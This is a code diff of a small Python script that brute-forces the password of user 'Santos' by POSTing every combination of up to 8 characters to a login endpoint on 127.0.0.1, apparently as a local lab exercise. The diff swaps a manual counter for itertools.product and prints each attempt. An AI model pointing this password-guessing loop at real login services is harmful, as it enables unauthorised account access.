@@ -1,8 +1,8 @@
 import time
 import requests
+import itertools
 
 alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-@"
-
 username = "Santos"
 
 intentos = 0
@@ -12,14 +12,12 @@ longitud = 1
 encontrado = False
 
 while not encontrado and longitud <= 8:
-    indices = [0] * longitud
-
-    while True:
-        intento = ""
-        for i in indices:
-            intento += alphabet[i]
-
+    
+    for combinacion in itertools.product(alphabet, repeat=longitud):
+        intento = "".join(combinacion)
         intentos += 1
+
+        print(intento) 
 
         response = requests.post(
             "http://127.0.0.1:8000/login",
@@ -28,21 +26,6 @@ while not encontrado and longitud <= 8:
 
         if response.status_code == 200:
             encontrado = True
-            break
-
-        if intentos % 1000 == 0:
-            print("Intentos:", intentos)
-
-        pos = longitud - 1
-        while pos >= 0:
-            indices[pos] += 1
-            if indices[pos] < len(alphabet):
-                break
-            else:
-                indices[pos] = 0
-                pos -= 1
-
-        if pos < 0:
             break
 
     longitud += 1
